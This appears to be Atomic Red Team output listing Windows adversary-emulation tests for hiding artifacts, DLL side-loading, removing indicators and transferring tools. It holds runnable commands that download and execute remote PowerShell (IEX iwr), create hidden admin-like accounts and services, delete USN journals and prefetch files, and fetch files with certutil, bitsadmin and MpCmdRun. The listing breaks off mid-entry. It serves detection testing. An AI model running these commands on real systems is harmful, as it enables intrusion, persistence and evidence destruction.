Technique: Hide Artifacts T1564
Atomic Test Name: Extract binary files via VBA
Atomic Test Number: 1
Atomic Test GUID: 6afe288a-8a8b-4d33-a629-8d03ba9dad3a
Description: This module extracts a binary (calc.exe) from inside of another binary. 
In the wild maldoc authors will use this technique to hide binaries inside of files stored  within the office document itself. An example of this technique can be seen in sample
f986040c7dd75b012e7dfd876acb33a158abf651033563ab068800f07f508226
This sample contains a document inside of itself. Document 1 is the actual maldoc itself, document 2 is the same document without all the malicious code. Document 1 will copy Documen
t 2 to the file system and then "peek" inside of this document and pull out the oleObject.bin file. Contained inside of this oleObject.bin file is a payload that is parsed out and ex
ecuted on the file system.

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
$macro = [System.IO.File]::ReadAllText("PathToAtomicsFolder\T1564\src\T1564-macrocode.txt")
$macro = $macro -replace "aREPLACEMEa", "PathToAtomicsFolder\T1564\bin\extractme.bin"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
Invoke-Maldoc -macroCode "$macro" -officeProduct "Word" -sub "Extract" -NoWrap
Command (with inputs):
$macro = [System.IO.File]::ReadAllText("C:\AtomicRedTeam\atomics\T1564\src\T1564-macrocode.txt")
$macro = $macro -replace "aREPLACEMEa", "C:\AtomicRedTeam\atomics\T1564\bin\extractme.bin"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
Invoke-Maldoc -macroCode "$macro" -officeProduct "Word" -sub "Extract" -NoWrap

Cleanup Commands:
Command:
Remove-Item "$env:TEMP\extracted.exe" -ErrorAction Ignore

Dependencies:
Description: Microsoft Word must be installed
Check Prereq Command:
try {
  New-Object -COMObject "Word.Application" | Out-Null
  Stop-Process -Name "winword"
  exit 0
} catch { exit 1 }
Get Prereq Command:
Write-Host "You will need to install Microsoft Word manually to meet this requirement"
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Hide Artifacts T1564
Atomic Test Name: Create a Hidden User Called "$"
Atomic Test Number: 2
Atomic Test GUID: 2ec63cc2-4975-41a6-bf09-dffdfb610778
Description: Creating a user with a username containing "$"

Attack Commands:
Executor: command_prompt
ElevationRequired: True
Command:
net user $ ATOMIC123! /add /active:yes

Cleanup Commands:
Command:
net user $ /DELETE 2>&1
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Hide Artifacts T1564
Atomic Test Name: Create an "Administrator " user (with a space on the end)
Atomic Test Number: 3
Atomic Test GUID: 5bb20389-39a5-4e99-9264-aeb92a55a85c
Description: Creating a user with a username containing with a space on the end

Attack Commands:
Executor: powershell
ElevationRequired: True
Command:
New-LocalUser -Name "Administrator " -NoPassword

Cleanup Commands:
Command:
Remove-LocalUser -Name "Administrator " 2>&1 | out-null
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Hide Artifacts T1564
Atomic Test Name: Create and Hide a Service with sc.exe
Atomic Test Number: 4
Atomic Test GUID: 333c7de0-6fbe-42aa-ac2b-c7e40b18246a
Description: The following technique utilizes sc.exe and sdset to change the security descriptor of a service and "hide" it from Get-Service or sc query.
Upon successful execution, sc.exe creates a new service changes the security descriptor.
https://twitter.com/Alh4zr3d/status/1580925761996828672 https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-string-format

Attack Commands:
Executor: command_prompt
ElevationRequired: True
Command:
sc.exe create #{service_name} binPath= "#{executable_command}"
sc sdset #{service_name} "D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;
;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)"
Command (with inputs):
sc.exe create AtomicService binPath= "C:\Windows\System32\calc.exe"
sc sdset AtomicService "D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSD
RCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)"

Cleanup Commands:
Command:
sc sdset #{service_name} "D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)"
sc.exe delete #{service_name}
Command (with inputs):
sc sdset AtomicService "D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)"
sc.exe delete AtomicService
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Hide Artifacts T1564
Atomic Test Name: Command Execution with NirCmd
Atomic Test Number: 5
Atomic Test GUID: 2748ab4a-1e0b-4cf2-a2b0-8ef765bec7be
Description: NirCmd is used by threat actors to execute commands, which can include recon and privilege escalation via running commands via the SYSTEM account See https://www.kroll.c
om/en/insights/publications/cyber/black-basta-technical-analysis

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
cmd /c "#{nircmd_location}" #{command_to_execute}
Command (with inputs):
cmd /c "C:\AtomicRedTeam\atomics\..\ExternalPayloads\nircmd.exe" win child class "Shell_TrayWnd" hide class "TrayClockWClass"

Cleanup Commands:
Command:
cmd /c "#{nircmd_location}" #{cleanup_command_to_execute} -erroraction silentlycontinue | out-null
Command (with inputs):
cmd /c "C:\AtomicRedTeam\atomics\..\ExternalPayloads\nircmd.exe" win child class "Shell_TrayWnd" show class "TrayClockWClass" -erroraction silentlycontinue | out-null

Dependencies:
Description: The Nircmd executable must exist at (C:\AtomicRedTeam\atomics\..\ExternalPayloads\nircmd.exe)
Check Prereq Command:
if (Test-Path "#{nircmd_location}") {exit 0} else {exit 1}
Check Prereq Command (with inputs):
if (Test-Path "C:\AtomicRedTeam\atomics\..\ExternalPayloads\nircmd.exe") {exit 0} else {exit 1}
Get Prereq Command:
New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
invoke-webrequest "https://www.nirsoft.net/utils/nircmd-x64.zip" -outfile "PathToAtomicsFolder\..\ExternalPayloads\nircmd.zip" 
expand-archive -path "PathToAtomicsFolder\..\ExternalPayloads\nircmd.zip" -destinationpath "PathToAtomicsFolder\..\ExternalPayloads\"
Get Prereq Command (with inputs):
New-Item -Type Directory "C:\AtomicRedTeam\atomics\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
invoke-webrequest "https://www.nirsoft.net/utils/nircmd-x64.zip" -outfile "C:\AtomicRedTeam\atomics\..\ExternalPayloads\nircmd.zip" 
expand-archive -path "C:\AtomicRedTeam\atomics\..\ExternalPayloads\nircmd.zip" -destinationpath "C:\AtomicRedTeam\atomics\..\ExternalPayloads\"
[!!!!!!!!END TEST!!!!!!!]


PathToAtomicsFolder = C:\AtomicRedTeam\atomics

[********BEGIN TEST*******]
Technique: Hide Artifacts: Hidden Window T1564.003
Atomic Test Name: Hidden Window
Atomic Test Number: 1
Atomic Test GUID: f151ee37-9e2b-47e6-80e4-550b9f999b7a
Description: Launch PowerShell with the "-WindowStyle Hidden" argument to conceal PowerShell windows by setting the WindowStyle parameter to hidden. Upon execution a hidden PowerShel
l window will launch calc.exe

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
Start-Process #{powershell_command}
Command (with inputs):
Start-Process powershell.exe -WindowStyle hidden calc.exe
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Hide Artifacts: Hidden Window T1564.003
Atomic Test Name: Headless Browser Accessing Mockbin
Atomic Test Number: 2
Atomic Test GUID: 0ad9ab92-c48c-4f08-9b20-9633277c4646
Description: The following Atomic Red Team test leverages the Chrome headless browser to access a mockbin site. Create your own Mockbin.org site and replace the BIN in the inputs. Th
e default Mockbin ID forwards to google.com and you may view the details here https://mockbin.org/bin/f6b9a876-a826-4ac0-83b8-639d6ad516ec/view. Reference: https://cert.gov.ua/articl
e/5702579

Attack Commands:
Executor: command_prompt
ElevationRequired: False
Command:
start "" #{browser} --headless --disable-gpu https://mockbin.org/bin/#{bin_id}
Command (with inputs):
start "" chrome --headless --disable-gpu https://mockbin.org/bin/f6b9a876-a826-4ac0-83b8-639d6ad516ec

Cleanup Commands:
Command:
taskkill /im #{browser} /f
Command (with inputs):
taskkill /im chrome /f
[!!!!!!!!END TEST!!!!!!!]


PathToAtomicsFolder = C:\AtomicRedTeam\atomics

ERROR: C:\AtomicRedTeam\atomics\T1574\T1574.yaml does not exist
Check your Atomic Number and your PathToAtomicsFolder parameter
PathToAtomicsFolder = C:\AtomicRedTeam\atomics

[********BEGIN TEST*******]
Technique: Hijack Execution Flow: DLL Side-Loading T1574.002
Atomic Test Name: DLL Side-Loading using the Notepad++ GUP.exe binary
Atomic Test Number: 1
Atomic Test GUID: 65526037-7079-44a9-bda1-2cb624838040
Description: GUP is an open source signed binary used by Notepad++ for software updates, and is vulnerable to DLL Side-Loading, thus enabling the libcurl dll to be loaded. Upon execu
tion, calc.exe will be opened.

Attack Commands:
Executor: command_prompt
ElevationRequired: False
Command:
"#{gup_executable}"
Command (with inputs):
"C:\AtomicRedTeam\atomics\T1574.002\bin\GUP.exe"

Cleanup Commands:
Command:
taskkill /F /IM #{process_name} >nul 2>&1
Command (with inputs):
taskkill /F /IM calculator.exe >nul 2>&1

Dependencies:
Description: Gup.exe binary must exist on disk at specified location (C:\AtomicRedTeam\atomics\T1574.002\bin\GUP.exe)
Check Prereq Command:
if (Test-Path "#{gup_executable}") {exit 0} else {exit 1}
Check Prereq Command (with inputs):
if (Test-Path "C:\AtomicRedTeam\atomics\T1574.002\bin\GUP.exe") {exit 0} else {exit 1}
Get Prereq Command:
New-Item -Type Directory (split-path "#{gup_executable}") -ErrorAction ignore | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.002/bin/GUP.exe?raw=true" -OutFile "#{gup_executable}"
Get Prereq Command (with inputs):
New-Item -Type Directory (split-path "C:\AtomicRedTeam\atomics\T1574.002\bin\GUP.exe") -ErrorAction ignore | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.002/bin/GUP.exe?raw=true" -OutFile "C:\AtomicRedTeam\atomics\T1574.002\bin\GUP.exe"
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Hijack Execution Flow: DLL Side-Loading T1574.002
Atomic Test Name: DLL Side-Loading using the dotnet startup hook environment variable
Atomic Test Number: 2
Atomic Test GUID: d322cdd7-7d60-46e3-9111-648848da7c02
Description: Utilizing the dotnet_startup_hooks environment variable, this method allows for registering a global method in an assembly that will be executed whenever a .net core app
lication is started. This unlocks a whole range of scenarios, from injecting a profiler to tweaking a static context in a given environment. [blog post](https://medium.com/criteo-eng
ineering/c-have-some-fun-with-net-core-startup-hooks-498b9ad001e1)

Attack Commands:
Executor: command_prompt
ElevationRequired: False
Command:
set DOTNET_STARTUP_HOOKS="#{preloader_dll}"
dotnet -h > nul
echo.
Command (with inputs):
set DOTNET_STARTUP_HOOKS="C:\AtomicRedTeam\atomics\T1574.002\bin\preloader.dll"
dotnet -h > nul
echo.

Cleanup Commands:
Command:
taskkill /F /IM #{process_name} >nul 2>&1
Command (with inputs):
taskkill /F /IM calculator.exe >nul 2>&1

Dependencies:
Description: .Net SDK must be installed
Check Prereq Command:
if (Test-Path "C:\Program Files\dotnet\dotnet.exe") {exit 0} else {exit 1}
Get Prereq Command:
winget install Microsoft.DotNet.SDK.6 --accept-source-agreements --accept-package-agreements -h > $null
echo.
Description: preloader must exist
Check Prereq Command:
if (Test-Path "#{preloader_dll}") {exit 0} else {exit 1}
Check Prereq Command (with inputs):
if (Test-Path "C:\AtomicRedTeam\atomics\T1574.002\bin\preloader.dll") {exit 0} else {exit 1}
Get Prereq Command:
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.002/bin/preloader?raw=true" -OutFile "#{preloader_dll}"
Get Prereq Command (with inputs):
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.002/bin/preloader?raw=true" -OutFile "C:\AtomicRedTeam\atomics\T1574.002\bin\preloader.dll
"
[!!!!!!!!END TEST!!!!!!!]


PathToAtomicsFolder = C:\AtomicRedTeam\atomics

[********BEGIN TEST*******]
Technique: Indicator Removal on Host T1070
Atomic Test Name: Indicator Removal using FSUtil
Atomic Test Number: 1
Atomic Test GUID: b4115c7a-0e92-47f0-a61e-17e7218b2435
Description: Manages the update sequence number (USN) change journal, which provides a persistent log of all changes made to files on the volume. Upon execution, no output will be di
splayed. More information about fsutil can be found at https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/fsutil-usn

Attack Commands:
Executor: command_prompt
ElevationRequired: True
Command:
fsutil usn deletejournal /D C:

Cleanup Commands:
Command:
fsutil usn createjournal m=1000 a=100 c:
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Indicator Removal on Host T1070
Atomic Test Name: Indicator Manipulation using FSUtil
Atomic Test Number: 2
Atomic Test GUID: 96e86706-6afd-45b6-95d6-108d23eaf2e9
Description: Finds a file by user name (if Disk Quotas are enabled), queries allocated ranges for a file, sets a file's short name, sets a file's valid data length, sets zero data fo
r a file, or creates a new file. Upon execution, no output will be displayed. More information about fsutil can be found at https://learn.microsoft.com/en-us/windows-server/administr
ation/windows-commands/fsutil-file - https://tria.ge/230601-x8x6bsgb24/behavioral2

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
if (-not (Test-Path "#{file_to_manipulate}")) { New-Item "#{file_to_manipulate}" -Force } 
echo "1234567890" > "#{file_to_manipulate}"
fsutil  file setZeroData offset=0 length=#{file_data_length} "#{file_to_manipulate}"
Command (with inputs):
if (-not (Test-Path "C:\AtomicRedTeam\atomics\..\ExternalPayloads\T1070-2.txt")) { New-Item "C:\AtomicRedTeam\atomics\..\ExternalPayloads\T1070-2.txt" -Force } 
echo "1234567890" > "C:\AtomicRedTeam\atomics\..\ExternalPayloads\T1070-2.txt"
fsutil  file setZeroData offset=0 length=10 "C:\AtomicRedTeam\atomics\..\ExternalPayloads\T1070-2.txt"

Cleanup Commands:
Command:
rm "#{file_to_manipulate}"
Command (with inputs):
rm "C:\AtomicRedTeam\atomics\..\ExternalPayloads\T1070-2.txt"
[!!!!!!!!END TEST!!!!!!!]


PathToAtomicsFolder = C:\AtomicRedTeam\atomics

[********BEGIN TEST*******]
Technique: Indicator Removal on Host: File Deletion T1070.004
Atomic Test Name: Delete a single file - Windows cmd
Atomic Test Number: 4
Atomic Test GUID: 861ea0b4-708a-4d17-848d-186c9c7f17e3
Description: Delete a single file from the temporary directory using cmd.exe. Upon execution, no output will be displayed. Use File Explorer to verify the file was deleted.

Attack Commands:
Executor: command_prompt
ElevationRequired: False
Command:
del /f #{file_to_delete}
Command (with inputs):
del /f %temp%\deleteme_T1551.004

Dependencies:
Description: The file to delete must exist on disk at specified location (%temp%\deleteme_T1551.004)
Check Prereq Command:
IF EXIST "#{file_to_delete}" ( EXIT 0 ) ELSE ( EXIT 1 )
Check Prereq Command (with inputs):
IF EXIST "%temp%\deleteme_T1551.004" ( EXIT 0 ) ELSE ( EXIT 1 )
Get Prereq Command:
echo deleteme_T1551.004 >> #{file_to_delete}
Get Prereq Command (with inputs):
echo deleteme_T1551.004 >> %temp%\deleteme_T1551.004
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Indicator Removal on Host: File Deletion T1070.004
Atomic Test Name: Delete an entire folder - Windows cmd
Atomic Test Number: 5
Atomic Test GUID: ded937c4-2add-42f7-9c2c-c742b7a98698
Description: Recursively delete a folder in the temporary directory using cmd.exe. Upon execution, no output will be displayed. Use File Explorer to verify the folder was deleted.

Attack Commands:
Executor: command_prompt
ElevationRequired: False
Command:
rmdir /s /q #{folder_to_delete}
Command (with inputs):
rmdir /s /q %temp%\deleteme_T1551.004

Dependencies:
Description: The file to delete must exist on disk at specified location (%temp%\deleteme_T1551.004)
Check Prereq Command:
IF EXIST "#{folder_to_delete}" ( EXIT 0 ) ELSE ( EXIT 1 )
Check Prereq Command (with inputs):
IF EXIST "%temp%\deleteme_T1551.004" ( EXIT 0 ) ELSE ( EXIT 1 )
Get Prereq Command:
mkdir #{folder_to_delete}
Get Prereq Command (with inputs):
mkdir %temp%\deleteme_T1551.004
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Indicator Removal on Host: File Deletion T1070.004
Atomic Test Name: Delete a single file - Windows PowerShell
Atomic Test Number: 6
Atomic Test GUID: 9dee89bd-9a98-4c4f-9e2d-4256690b0e72
Description: Delete a single file from the temporary directory using Powershell. Upon execution, no output will be displayed. Use File Explorer to verify the file was deleted.

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
Remove-Item -path #{file_to_delete}
Command (with inputs):
Remove-Item -path $env:TEMP\deleteme_T1551.004

Dependencies:
Description: The file to delete must exist on disk at specified location ($env:TEMP\deleteme_T1551.004)
Check Prereq Command:
if (Test-Path #{file_to_delete}) {exit 0} else {exit 1}
Check Prereq Command (with inputs):
if (Test-Path $env:TEMP\deleteme_T1551.004) {exit 0} else {exit 1}
Get Prereq Command:
New-Item -Path #{file_to_delete} | Out-Null
Get Prereq Command (with inputs):
New-Item -Path $env:TEMP\deleteme_T1551.004 | Out-Null
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Indicator Removal on Host: File Deletion T1070.004
Atomic Test Name: Delete an entire folder - Windows PowerShell
Atomic Test Number: 7
Atomic Test GUID: edd779e4-a509-4cba-8dfa-a112543dbfb1
Description: Recursively delete a folder in the temporary directory using Powershell. Upon execution, no output will be displayed. Use File Explorer to verify the folder was deleted.

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
Remove-Item -Path #{folder_to_delete} -Recurse
Command (with inputs):
Remove-Item -Path $env:TEMP\deleteme_folder_T1551.004 -Recurse

Dependencies:
Description: The folder to delete must exist on disk at specified location ($env:TEMP\deleteme_folder_T1551.004)
Check Prereq Command:
if (Test-Path #{folder_to_delete}) {exit 0} else {exit 1}
Check Prereq Command (with inputs):
if (Test-Path $env:TEMP\deleteme_folder_T1551.004) {exit 0} else {exit 1}
Get Prereq Command:
New-Item -Path #{folder_to_delete} -Type Directory | Out-Null
Get Prereq Command (with inputs):
New-Item -Path $env:TEMP\deleteme_folder_T1551.004 -Type Directory | Out-Null
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Indicator Removal on Host: File Deletion T1070.004
Atomic Test Name: Delete Prefetch File
Atomic Test Number: 9
Atomic Test GUID: 36f96049-0ad7-4a5f-8418-460acaeb92fb
Description: Delete a single prefetch file.  Deletion of prefetch files is a known anti-forensic technique. To verify execution, Run "(Get-ChildItem -Path "$Env:SystemRoot\prefetch\*
.pf" | Measure-Object).Count" before and after the test to verify that the number of prefetch files decreases by 1.

Attack Commands:
Executor: powershell
ElevationRequired: True
Command:
Remove-Item -Path (Join-Path "$Env:SystemRoot\prefetch\" (Get-ChildItem -Path "$Env:SystemRoot\prefetch\*.pf" -Name)[0])
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Indicator Removal on Host: File Deletion T1070.004
Atomic Test Name: Delete TeamViewer Log Files
Atomic Test Number: 10
Atomic Test GUID: 69f50a5f-967c-4327-a5bb-e1a9a9983785
Description: Adversaries may delete TeamViewer log files to hide activity. This should provide a high true-positive alert ration. This test just places the files in a non-TeamViewer 
folder, a detection would just check for a deletion event matching the TeamViewer log file format of TeamViewer_##.log. Upon execution, no output will be displayed. Use File Explorer
 to verify the folder was deleted.
https://twitter.com/SBousseaden/status/1197524463304290305?s=20

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
New-Item -Path #{teamviewer_log_file} -Force | Out-Null
Remove-Item #{teamviewer_log_file} -Force -ErrorAction Ignore
Command (with inputs):
New-Item -Path $env:TEMP\TeamViewer_54.log -Force | Out-Null
Remove-Item $env:TEMP\TeamViewer_54.log -Force -ErrorAction Ignore
[!!!!!!!!END TEST!!!!!!!]


PathToAtomicsFolder = C:\AtomicRedTeam\atomics

[********BEGIN TEST*******]
Technique: Ingress Tool Transfer T1105
Atomic Test Name: certutil download (urlcache)
Atomic Test Number: 7
Atomic Test GUID: dd3b61dd-7bbc-48cd-ab51-49ad1a776df0
Description: Use certutil -urlcache argument to download a file from the web. Note - /urlcache also works!

Attack Commands:
Executor: command_prompt
ElevationRequired: False
Command:
cmd /c certutil -urlcache -split -f #{remote_file} #{local_path}
Command (with inputs):
cmd /c certutil -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt Atomic-license.txt

Cleanup Commands:
Command:
del #{local_path} >nul 2>&1
Command (with inputs):
del Atomic-license.txt >nul 2>&1
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Ingress Tool Transfer T1105
Atomic Test Name: certutil download (verifyctl)
Atomic Test Number: 8
Atomic Test GUID: ffd492e3-0455-4518-9fb1-46527c9f241b
Description: Use certutil -verifyctl argument to download a file from the web. Note - /verifyctl also works!

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
$datePath = "certutil-$(Get-Date -format yyyy_MM_dd)"
New-Item -Path $datePath -ItemType Directory
Set-Location $datePath
certutil -verifyctl -split -f #{remote_file}
Get-ChildItem | Where-Object {$_.Name -notlike "*.txt"} | Foreach-Object { Move-Item $_.Name -Destination #{local_path} }
Command (with inputs):
$datePath = "certutil-$(Get-Date -format yyyy_MM_dd)"
New-Item -Path $datePath -ItemType Directory
Set-Location $datePath
certutil -verifyctl -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt
Get-ChildItem | Where-Object {$_.Name -notlike "*.txt"} | Foreach-Object { Move-Item $_.Name -Destination Atomic-license.txt }

Cleanup Commands:
Command:
Remove-Item "certutil-$(Get-Date -format yyyy_MM_dd)" -Force -Recurse -ErrorAction Ignore
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Ingress Tool Transfer T1105
Atomic Test Name: Windows - BITSAdmin BITS Download
Atomic Test Number: 9
Atomic Test GUID: a1921cd3-9a2d-47d5-a891-f1d0f2a7a31b
Description: This test uses BITSAdmin.exe to schedule a BITS job for the download of a file. This technique is used by Qbot malware to download payloads.

Attack Commands:
Executor: command_prompt
ElevationRequired: False
Command:
C:\Windows\System32\bitsadmin.exe /transfer #{bits_job_name} /Priority HIGH #{remote_file} #{local_path}
Command (with inputs):
C:\Windows\System32\bitsadmin.exe /transfer qcxjb7 /Priority HIGH https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt %temp%\Atomic-license.txt
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Ingress Tool Transfer T1105
Atomic Test Name: Windows - PowerShell Download
Atomic Test Number: 10
Atomic Test GUID: 42dc4460-9aa6-45d3-b1a6-3955d34e1fe8
Description: This test uses PowerShell to download a payload. This technique is used by multiple adversaries and malware families.

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
(New-Object System.Net.WebClient).DownloadFile("#{remote_file}", "#{destination_path}")
Command (with inputs):
(New-Object System.Net.WebClient).DownloadFile("https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt", "$env:TEMP\Atomic-license.txt")

Cleanup Commands:
Command:
Remove-Item #{destination_path} -Force -ErrorAction Ignore
Command (with inputs):
Remove-Item $env:TEMP\Atomic-license.txt -Force -ErrorAction Ignore
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Ingress Tool Transfer T1105
Atomic Test Name: OSTAP Worming Activity
Atomic Test Number: 11
Atomic Test GUID: 2ca61766-b456-4fcf-a35a-1233685e1cad
Description: OSTap copies itself in a specfic way to shares and secondary drives. This emulates the activity.

Attack Commands:
Executor: command_prompt
ElevationRequired: True
Command:
pushd #{destination_path}
echo var fileObject = WScript.createobject("Scripting.FileSystemObject");var newfile = fileObject.CreateTextFile("AtomicTestFileT1105.js", true);newfile.WriteLine("This is an atomic 
red team test file for T1105. It simulates how OSTap worms accross network shares and drives.");newfile.Close(); > AtomicTestT1105.js
CScript.exe AtomicTestT1105.js //E:JScript
del AtomicTestT1105.js /Q >nul 2>&1
del AtomicTestFileT1105.js /Q >nul 2>&1
popd
Command (with inputs):
pushd \\localhost\C$
echo var fileObject = WScript.createobject("Scripting.FileSystemObject");var newfile = fileObject.CreateTextFile("AtomicTestFileT1105.js", true);newfile.WriteLine("This is an atomic 
red team test file for T1105. It simulates how OSTap worms accross network shares and drives.");newfile.Close(); > AtomicTestT1105.js
CScript.exe AtomicTestT1105.js //E:JScript
del AtomicTestT1105.js /Q >nul 2>&1
del AtomicTestFileT1105.js /Q >nul 2>&1
popd
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Ingress Tool Transfer T1105
Atomic Test Name: svchost writing a file to a UNC path
Atomic Test Number: 12
Atomic Test GUID: fa5a2759-41d7-4e13-a19c-e8f28a53566f
Description: svchost.exe writing a non-Microsoft Office file to a file with a UNC path. Upon successful execution, this will rename cmd.exe as svchost.exe and move it to `c:\`, then 
execute svchost.exe with output to a txt file.

Attack Commands:
Executor: command_prompt
ElevationRequired: True
Command:
copy C:\Windows\System32\cmd.exe C:\svchost.exe
C:\svchost.exe /c echo T1105 > \\localhost\c$\T1105.txt

Cleanup Commands:
Command:
del C:\T1105.txt >nul 2>&1
del C:\\svchost.exe >nul 2>&1
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Ingress Tool Transfer T1105
Atomic Test Name: Download a File with Windows Defender MpCmdRun.exe
Atomic Test Number: 13
Atomic Test GUID: 815bef8b-bf91-4b67-be4c-abe4c2a94ccc
Description: Uses Windows Defender MpCmdRun.exe to download a file from the internet (must have version 4.18 installed). The input arguments "remote_file" and "local_path" can be use
d to specify the download URL and the name of the output file. By default, the test downloads the Atomic Red Team license file to the temp directory.
More info and how to find your version can be found here https://lolbas-project.github.io/lolbas/Binaries/MpCmdRun/

Attack Commands:
Executor: command_prompt
ElevationRequired: False
Command:
cd "%ProgramData%\Microsoft\Windows Defender\platform\4.18*"
MpCmdRun.exe -DownloadFile -url #{remote_file} -path #{local_path}
Command (with inputs):
cd "%ProgramData%\Microsoft\Windows Defender\platform\4.18*"
MpCmdRun.exe -DownloadFile -url https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt -path %temp%\Atomic-license.txt

Cleanup Commands:
Command:
del #{local_path} >nul 2>&1
del %temp%\MpCmdRun.log >nul 2>&1
Command (with inputs):
del %temp%\Atomic-license.txt >nul 2>&1
del %temp%\MpCmdRun.log >nul 2>&1

Dependencies:
Description: Must have a Windows Defender version with MpCmdRun.exe installed
Check Prereq Command:
cd "%ProgramData%\Microsoft\Windows Defender\platform\4.18*"
MpCmdRun.exe /?  >nul 2>&1
Get Prereq Command:
Echo "A version of Windows Defender with MpCmdRun.exe must be installed manually"
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Ingress Tool Transfer T1105
Atomic Test Name: File Download via PowerShell
Atomic Test Number: 15
Atomic Test GUID: 54a4daf1-71df-4383-9ba7-f1a295d8b6d2
Description: Use PowerShell to download and write an arbitrary file from the internet. Example is from the 2021 Threat Detection Report by Red Canary.

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
(New-Object Net.WebClient).DownloadString('#{target_remote_file}') | Out-File #{output_file}; Invoke-Item #{output_file}
Command (with inputs):
(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/4042cb3433bce024e304500dcfe3c5590571573a/LICENSE.txt') | Out-File LICENSE.txt
; Invoke-Item LICENSE.txt
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Ingress Tool Transfer T1105
Atomic Test Name: File download with finger.exe on Windows
Atomic Test Number: 16
Atomic Test GUID: 5f507e45-8411-4f99-84e7-e38530c45d01
Description: Simulate a file download using finger.exe. Connect to localhost by default, use custom input argument to test finger connecting to an external server. Because this is be
ing tested on the localhost, you should not be expecting a successful connection https://www.exploit-db.com/exploits/48815 https://www.bleepingcomputer.com/news/security/windows-10-f
inger-command-can-be-abused-to-download-or-steal-files/

Attack Commands:
Executor: command_prompt
ElevationRequired: False
Command:
finger base64_filedata@#{remote_host}
Command (with inputs):
finger base64_filedata@localhost
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Ingress Tool Transfer T1105
Atomic Test Name: Download a file with IMEWDBLD.exe
Atomic Test Number: 17
Atomic Test GUID: 1a02df58-09af-4064-a765-0babe1a0d1e2
